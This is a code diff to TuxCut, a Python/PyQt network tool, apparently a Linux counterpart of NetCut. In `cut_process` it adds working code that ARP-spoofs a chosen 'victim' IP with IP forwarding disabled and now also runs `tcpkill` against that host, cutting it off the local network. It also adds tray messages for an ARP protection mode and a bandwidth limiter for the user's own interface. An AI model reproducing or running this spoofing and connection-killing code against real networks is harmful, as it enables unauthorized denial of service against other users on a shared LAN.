@@ -43,7 +43,8 @@ class TuxCut(QtGui.QMainWindow):
 		self.check_fedora()
 		self._isQuit = False
 		self._cutted_hosts = {}
-		
+		self._killed_hosts = {}
+		self.show_Window()
 		self._gwIP = self.default_gw()
 		if  self._gwIP==None:
 			self.msg(self.tr("TuxCut couldn't detect the gateway IP address"))
@@ -57,8 +58,6 @@ class TuxCut(QtGui.QMainWindow):
 			self.enable_protection()
 		else:
 			self.msg(self.tr("TuxCut couldn't detect the gateway MAC address\nThe protection mode couldn't be enabled"))
-			
-		self.show_Window()
 		self.list_hosts(self._gwIP)
 		
 		
@@ -178,9 +177,9 @@ class TuxCut(QtGui.QMainWindow):
 		sp.Popen(['arp','-s',self._gwIP,self._gwMAC],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		
 		self._isProtected = True
+		self.trayicon.showMessage(self.tr('Protection Enabled!'), self.tr('You are protected againest NetCut attacks'))
 		if not self.cbox_protection.isChecked():
 			self.cbox_protection.setCheckState(QtCore.Qt.Checked)
-			
 		
 	def disable_protection(self):
 		if self._isFedora:
@@ -191,21 +190,26 @@ class TuxCut(QtGui.QMainWindow):
 			sp.Popen(['arptables','-P','OUTPUT','ACCEPT'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		sp.Popen(['arptables','-F'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		self._isProtected = False
+		self.trayicon.showMessage(self.tr('Protection Disabled!'), self.tr('You are not protected againest NetCut attacks'))
 		
 	def cut_process(self,victim_IP,row):
 		## Disable ip forward
 		proc = sp.Popen(['sysctl','-w','net.ipv4.ip_forward=0'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-
+		
 		### Start Arpspoofing the victim
-		proc = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		self._cutted_hosts[victim_IP]=proc.pid
+		proc_spoof = sp.Popen(['arpspoof','-i',self._iface,'-t',self._gwIP,victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		#os.system("sudo tcpkill -i "+icard+" -3 net "+vicip+" & >/dev/null")
+		proc_kill = sp.Popen(['tcpkill','-i',self._iface,'-3','net',victim_IP],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		self._cutted_hosts[victim_IP]=proc_spoof.pid
+		self._killed_hosts[victim_IP]=proc_kill.pid
 		self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/offline.png'))
-		print self._cutted_hosts
+		print "Cutted hosts are : ",self._cutted_hosts
+		print "Killed hosts are : ",self._killed_hosts
 	
 	def resume_all(self):
 		sp.Popen(['sysctl','-w','net.ipv4.ip_forward=1'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
-		sp.Popen(['killall','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		sp.Popen(['killall','9','arpspoof'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		sp.Popen(['killall','9','tcpkill'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
 		hosts_number = self.table_hosts.rowCount()
 		for i in range (0,self.table_hosts.rowCount()):
 			self.table_hosts.item(i,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
@@ -216,14 +220,14 @@ class TuxCut(QtGui.QMainWindow):
 		
 	def resume_single_host(self,victim_IP,row):
 		if self._cutted_hosts.has_key(victim_IP):
-			pid = self._cutted_hosts[victim_IP]
-			print "resuming >>>> ",pid
-			os.kill(pid,9)
+			pid_spoof = self._cutted_hosts[victim_IP]
+			os.kill(pid_spoof,9)
 			self.table_hosts.item(row,0).setIcon(QtGui.QIcon(':pix/pix/online.png'))
 			del self._cutted_hosts[victim_IP]
-			print self._cutted_hosts
-		else:
-			print victim_IP,'is not attacked'
+		if self._killed_hosts.has_key(victim_IP):
+			pid_kill = self._killed_hosts[victim_IP]
+			os.kill(pid_kill,9)
+			del self._killed_hosts[victim_IP]
 		
 	def change_mac(self):
 		new_MAC =':'.join(map(lambda x: "%02x" % x, [ 0x00,
@@ -287,4 +291,22 @@ class TuxCut(QtGui.QMainWindow):
 		self.actionArabic.setChecked(False)
 		self.settings.setValue("Language","English")
 		
-	
+	def limit_speed(self):
+		speedLimit, ok = QtGui.QInputDialog.getInteger(self, self.tr('Speed Limiter'), self.tr('Enter your desired speed in Kilo-Bytes per second:'))
+		if ok:
+			self.action_speedlimiter_on.setChecked(True)
+			self.action_speedlimiter_off.setChecked(False)
+			sp.Popen(['wondershaper',self._iface,str(speedLimit),'9999999'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+			self.trayicon.showMessage(self.tr('Speed Limiter Enabled!'), self.tr('Your Speed is limited to %s Kb/Sec'%speedLimit))
+		else:
+			self.action_speedlimiter_off.setChecked(True)
+			self.action_speedlimiter_on.setChecked(False)
+
+	def unlimit_speed(self):
+		self.action_speedlimiter_on.setChecked(False)
+		sp.Popen(['wondershaper','clear',self._iface],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		sp.Popen(['killall','9','wondershaper'],stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE,shell=False)
+		self.trayicon.showMessage(self.tr('Speed Limiter Disabled!'), self.tr('Your Speed is not limited'))
+		
+	def about_qt(self):
+		QtGui.QApplication.aboutQt()
